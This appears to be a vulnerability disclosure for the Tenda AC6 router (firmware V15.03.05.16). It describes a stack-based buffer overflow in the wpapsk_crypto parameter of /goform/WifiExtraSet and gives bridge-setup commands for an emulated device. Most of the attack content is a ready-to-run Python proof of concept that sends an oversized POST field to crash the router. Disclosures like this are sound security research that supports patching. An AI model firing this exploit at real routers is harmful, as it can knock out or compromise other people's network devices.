### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站： [AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)

![image](https://github.com/user-attachments/assets/75eb2018-df60-4c06-bfb0-1920038a3a22)


### Affected version

**V15.03.05.16**

### Environmental simulation

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

### Vulnerability details

A vulnerability was found in Tenda AC6 V15.03.05.16. The file /goform/WifiExtraSet is affected. Using the wpapsk\_crypto parameter causes a stack-based buffer overflow

![image](https://github.com/user-attachments/assets/1e8954c4-4424-46f3-a658-f34b36f61e00)


### poc

```text-plain
import requests

url = "http://192.168.142.100/goform/WifiExtraSet"
data = {
    "wifi_chkHz": "1",
    "wl_mode": "wisp",
    "wl_enbale": "1",
    "country_code": "CN",
    "wpsEn": "0",
    "guestEn": "0",
    "iptvEn": "0",
    "wifiTimerEn": "1",
    "smartSaveEn": "1",
    "dmzEn": "1",
    "handset": "0",
    "ssid": "fcniux",
    "wpapsk_key": "11111111",
    "security": "wpapsk",
    "wpapsk_type": "wpa",
    "wpapsk_crypto": b"Raining" * 28, 
    "mac": "undifined"
}

response = requests.post(url, data=data)
print(response.status_code)
print(response.text)
```
![image](https://github.com/user-attachments/assets/e6ae499e-2f2e-47d3-ad7c-b5ec863472fc)

